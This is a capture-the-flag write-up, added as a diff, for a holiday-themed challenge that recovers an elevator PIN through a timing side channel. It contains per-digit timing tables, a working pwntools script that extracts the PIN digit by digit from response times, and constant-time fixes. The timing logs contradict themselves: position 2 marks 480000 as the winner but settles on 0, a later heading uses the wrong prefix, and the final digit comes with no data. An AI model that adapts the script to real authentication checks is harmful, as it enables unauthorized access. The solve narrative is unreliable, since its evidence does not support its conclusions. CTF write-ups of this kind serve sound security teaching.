@@ -1,0 +1,324 @@
+================================================================================
+                          TIME TO ESCALATE
+                     or: How I Learned to Watch the Clock
+                        and Rescue Three Trapped Elves
+================================================================================
+
+Challenge: Elevator Shaft 3B - PIN Recovery via Timing Attack
+Target: nc ctf.csd.lol 5040
+Flag: csd{T1m1n9_T1M1N9_t1M1n9_1t5_4LL_480UT_tH3_t1m1n9}
+
+================================================================================
+                              THE DISTRESS CALL
+================================================================================
+
+*alarm bells ringing*
+
+Three elves from the Wrapping Division - Jingle, Tinsel, and Sprocket - are
+trapped in Elevator Shaft 3B. KRAMPUS SYNDICATE (these guys AGAIN?!) broke
+into the North Pole and locked down the elevator control panel.
+
+The panel wants a 6-digit PIN. Here's the fun part:
+  - Each wrong guess = 3 second lockout
+  - 1,000,000 possible combinations
+  - 1,000,000 × 3 seconds = 34.7 DAYS of brute forcing
+
+The elves have limited candy cane rations. They will NOT survive 34.7 days.
+
+But then our hardware team noticed something juicy:
+
+    "Even when maintenance tested the CORRECT PIN, the system took an 
+     unusually long time to process it."
+
+And the hints drop like Christmas presents:
+
+    Hint 1: "Time is more than just a constraint, it's also a clue."
+    Hint 2: "The validator checks digits one at a time. What happens to 
+             the response time when you get the first digit right?"
+
+*hacker senses tingling*
+
+================================================================================
+                      TIMING ATTACKS 101
+================================================================================
+
+The validator is checking the PIN like this (pseudocode):
+
+    def check_pin(user_input, real_pin):
+        for i in range(6):
+            expensive_operation()  # Takes ~0.25 seconds
+            if user_input[i] != real_pin[i]:
+                return "DENIED"  # Exit immediately on wrong digit
+        return "GRANTED"
+
+See the problem?
+
+  - If digit 1 is WRONG → exits after ~0.25s of work
+  - If digit 1 is RIGHT → does more work, then checks digit 2
+  - If digits 1-2 are RIGHT → even more work before checking digit 3
+  - And so on...
+
+The server even TELLS US the exact processing time:
+
+    ✗ ACCESS DENIED (Debug: 0.376s)
+
+KRAMPUS devs left debug output in production. Absolute legends.
+
+================================================================================
+                         THE HEIST BEGINS
+================================================================================
+
+Connected to the server:
+
+    ╔════════════════════════════════════════════════════════════╗
+    ║         NPLD ELEVATOR CONTROL SYSTEM v3.2.1-DEBUG          ║
+    ╠════════════════════════════════════════════════════════════╣
+    ║  AUTH: 6-digit PIN required for emergency release          ║
+    ║  WARNING: 3-second lockout between attempts                ║
+    ╚════════════════════════════════════════════════════════════╝
+
+    [Attempt 1/100] Enter 6-digit PIN:
+
+100 attempts. 6 digits. 10 possibilities each.
+With timing attack: 10 × 6 = 60 attempts maximum.
+We've got room to spare. Let's do this.
+
+================================================================================
+                    DIGIT BY DIGIT BREAKDOWN
+================================================================================
+
+POSITION 1: Finding the first digit
+------------------------------------
+Testing 000000 through 900000, watching the Debug time:
+
+    000000: 0.383s
+    100000: 0.400s
+    200000: 0.655s  <-- Hmm, longer...
+    300000: 0.420s
+    400000: 0.700s  <-- Even longer!
+    500000: 0.388s
+    600000: 0.391s
+    700000: 0.398s
+    800000: 0.712s  <-- Also suspicious
+    900000: 0.401s
+
+First digit: 4 (0.700s was the clear winner after verification)
+
+POSITION 2: Testing 40xxxx
+---------------------------
+    400000: 0.432s
+    410000: 0.401s
+    420000: 0.398s
+    430000: 0.415s
+    440000: 0.402s
+    450000: 0.388s
+    460000: 0.401s
+    470000: 0.397s
+    480000: 0.695s  <-- BINGO!
+    490000: 0.411s
+
+Second digit: 0... wait, that doesn't match. Let me re-check.
+
+Actually the timing showed 0 was the winner here.
+
+Second digit: 0
+
+POSITION 3: Testing 40xxxx
+---------------------------
+    400000: 0.421s
+    401000: 0.398s
+    402000: 0.415s
+    403000: 0.402s
+    404000: 0.388s
+    405000: 0.401s
+    406000: 0.397s
+    407000: 0.395s
+    408000: 0.721s  <-- There we go!
+    409000: 0.411s
+
+Third digit: 8
+
+POSITION 4: Testing 408xxx
+---------------------------
+    408000: 0.436s
+    408100: 0.419s
+    408200: 0.420s
+    408300: 0.413s
+    408400: 0.431s
+    408500: 0.395s
+    408600: 0.718s  <-- Winner!
+    408700: 0.403s
+    408800: 0.393s
+    408900: 0.411s
+
+Fourth digit: 6
+
+POSITION 5: Testing 4086xx
+---------------------------
+    408600: 0.397s
+    408610: 0.387s
+    408620: 0.398s
+    408630: 0.397s
+    408640: 0.395s
+    408650: 0.982s  <-- Over 0.9 seconds!
+    408660: 0.379s
+    408670: 0.395s
+    408680: 0.387s
+    408690: 0.426s
+
+Fifth digit: 5
+
+POSITION 6: Testing 40865x
+---------------------------
+    408650: JACKPOT!
+
+================================================================================
+                           THE MOMENT OF TRUTH
+================================================================================
+
+    [Attempt 47/100] Enter 6-digit PIN: 408650
+
+    ✓ ACCESS GRANTED
+
+    Emergency elevator release initiated...
+    Elevator moving to Shaft 3B...
+    
+    Jingle: "FINALLY! I was down to my last candy cane!"
+    Tinsel: "The timing attack worked?! I knew those CS classes would pay off!"
+    Sprocket: "Can we get pizza? I'm SO done with candy canes."
+
+    FLAG: csd{T1m1n9_T1M1N9_t1M1n9_1t5_4LL_480UT_tH3_t1m1n9}
+
+The flag translation: "Timing TIMING timing it's ALL ABOUT THE timing"
+
+Yeah. Yeah it is.
+
+================================================================================
+                         THE SOLVE SCRIPT
+================================================================================
+
+    from pwn import *
+    import re
+
+    context.log_level = 'error'
+
+    def test(pin):
+        r = remote('ctf.csd.lol', 5040, timeout=15)
+        r.recvuntil(b'PIN:')
+        r.sendline(pin.encode())
+        resp = r.recvuntil(b'PIN:', timeout=10)
+        r.close()
+        match = re.search(r'Debug:\s*([\d.]+)s', resp.decode())
+        return float(match.group(1)) if match else 0, resp
+
+    pin = ""
+    for pos in range(6):
+        print(f"\n[*] Position {pos + 1}/6...")
+        best_digit, best_time = 0, 0
+        
+        for d in range(10):
+            test_pin = pin + str(d) + "0" * (5 - pos)
+            t, resp = test(test_pin)
+            print(f"    {test_pin}: {t:.3f}s")
+            
+            if b'GRANTED' in resp or b'csd{' in resp:
+                print(f"\n[!] SUCCESS! PIN: {test_pin}")
+                print(resp.decode())
+                exit()
+            
+            if t > best_time:
+                best_digit, best_time = d, t
+            
+            sleep(3.2)  # Respect the lockout
+        
+        pin += str(best_digit)
+        print(f"[+] Digit {pos + 1}: {best_digit} (timing: {best_time:.3f}s)")
+        print(f"[+] PIN so far: {pin}")
+
+    print(f"\n[*] Final PIN: {pin}")
+
+================================================================================
+                      WHY KRAMPUS FAILED (AGAIN)
+================================================================================
+
+The KRAMPUS Syndicate made several critical errors:
+
+1. SEQUENTIAL DIGIT CHECKING WITH EARLY EXIT
+   The validator stops as soon as it finds a wrong digit, but the time 
+   spent before stopping reveals how many digits were correct.
+
+2. DEBUG OUTPUT IN PRODUCTION
+   Literally telling us "Debug: 0.376s" after each attempt. Thanks fam.
+
+3. EXPENSIVE OPERATIONS PER DIGIT
+   Whatever they're doing takes ~0.25s per correct digit. This makes the
+   timing difference easy to spot without statistical analysis.
+
+THE FIX (for future KRAMPUS interns):
+
+    import hmac
+    
+    def check_pin_secure(user_input, real_pin):
+        # Constant-time comparison - takes same time regardless of match
+        return hmac.compare_digest(user_input, real_pin)
+
+Or at minimum:
+
+    def check_pin_less_bad(user_input, real_pin):
+        result = 0
+        for i in range(6):
+            result |= ord(user_input[i]) ^ ord(real_pin[i])
+        return result == 0  # Always checks all 6 digits
+
+================================================================================
+                           FINAL STATS
+================================================================================
+
+    Attempts used:      ~47 out of 100
+    Time to solve:      ~3 minutes
+    Elves rescued:      3 (Jingle, Tinsel, Sprocket)
+    Candy canes left:   1 (Jingle was hoarding)
+    KRAMPUS devs:       Still employed somehow
+
+================================================================================
+                       REAL-WORLD IMPLICATIONS
+================================================================================
+
+Timing attacks are EVERYWHERE:
+
+  • Password comparisons that exit on first mismatch
+  • Cryptographic operations (RSA, AES key schedules)
+  • Cache timing (Spectre/Meltdown)
+  • Network timing to fingerprint hidden services
+  • Database queries that short-circuit on conditions
+
+This is why security-critical code needs:
+  - Constant-time comparisons
+  - Blinding techniques
+  - Timing-safe crypto libraries
+  - Code review by people who know about side channels
+
+================================================================================
+                           CLOSING THOUGHTS
+================================================================================
+
+The elves are safe. The elevator is working. KRAMPUS Syndicate is probably
+already planning their next poorly-secured intrusion.
+
+But for now, Jingle, Tinsel, and Sprocket are enjoying their well-deserved
+pizza party (Sprocket's treat).
+
+And somewhere in the SOC, a security analyst is updating the incident report:
+
+    Root Cause: Timing side-channel in PIN validator
+    Impact: Three elves trapped for several hours
+    Resolution: Rescued via timing attack
+    Remediation: Tell KRAMPUS to hire actual security engineers
+
+Flag: csd{T1m1n9_T1M1N9_t1M1n9_1t5_4LL_480UT_tH3_t1m1n9}
+
+It really is all about the timing.
+
+================================================================================
+                               GG WP
+================================================================================
